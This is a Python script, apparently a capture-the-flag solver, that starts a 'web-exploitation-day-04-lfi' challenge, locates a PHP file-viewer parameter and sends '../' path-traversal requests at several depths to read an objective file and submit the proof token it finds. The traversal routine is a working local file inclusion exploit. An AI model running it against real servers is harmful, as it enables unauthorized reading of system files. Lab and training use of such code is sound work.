import sys, time, re, requests
sys.path.insert(0, "~/ctf")
from gm import GM
UA={"User-Agent":"ctf-recon"}
PROOF=re.compile(r"proof_[0-9a-fA-F]{16,}")
g=GM()

def wait_ready(url, limit=120):
    url=url.rstrip("/"); t0=time.time()
    while time.time()-t0<limit:
        try:
            s=requests.Session(); s.headers.update(UA)
            r=s.get(url+"/", timeout=8)
            if r.status_code==200 and "<" in r.text and "expired" not in r.text:
                return s, r.text
        except Exception: pass
        time.sleep(3)
    return None, None

def solve_lfi(url):
    s=requests.Session(); s.headers.update(UA)
    home=s.get(url.rstrip("/")+"/", timeout=10).text
    # detect viewer endpoint + param
    m=re.search(r"([A-Za-z0-9_]+\.php)\?([A-Za-z0-9_]+)=", home)
    endpoint="/"+(m.group(1) if m else "reader.php"); param=m.group(2) if m else "doc"
    targets=["run/huntress/objective.txt"]
    for depth in (8,10,12,6,16,20):
        for tgt in targets:
            doc=("../"*depth)+tgt
            try:
                r=s.get(url.rstrip("/")+endpoint, params={param:doc}, timeout=12)
            except Exception: continue
            mm=PROOF.search(r.text)
            if mm: return mm.group(0)
    return None

def run(ch, run_for_time=None):
    body={"op":"start","challenge":ch}
    if run_for_time is not None: body["run_for_time"]=run_for_time
    r=g.post(body)
    if r.get("error"):
        # single route rejects run_for_time; retry w/o
        r=g.post({"op":"start","challenge":ch})
    w=0
    while not r.get("targets") and w<75:
        time.sleep(5); w+=5; r=g.status(ch)
    tgs=r.get("targets",[]); qs=r.get("questions",[])
    if not tgs:
        print("  [%s] NO TARGET %s" % (ch, r.get("error"))); return False
    ans={}
    for q in qs:
        # map question to its target url
        turl=None
        for t in tgs:
            if t.get("id")==q.get("artifact"): turl=t.get("url"); break
        turl=turl or tgs[0].get("url")
        s,home=wait_ready(turl)
        pf=solve_lfi(turl) if s else None
        print("  [%s] %s (%s) -> %s" % (ch, q["id"], turl[:50], pf))
        if pf: ans[q["id"]]=pf
    if ans and len(ans)==len(qs):
        res=g.submit(ch, ans)
        print("  [%s] SUBMIT %s flag=%s" % (ch, res.get("result"), res.get("flag")))
        return res.get("result") in ("CORRECT","accepted")
    return False

base="web-exploitation-day-04-lfi"
print("== single =="); run(base, None)
print("== time_trial =="); run(base+"/time_trial", False)
print("== mastery =="); run(base+"/mastery", False)
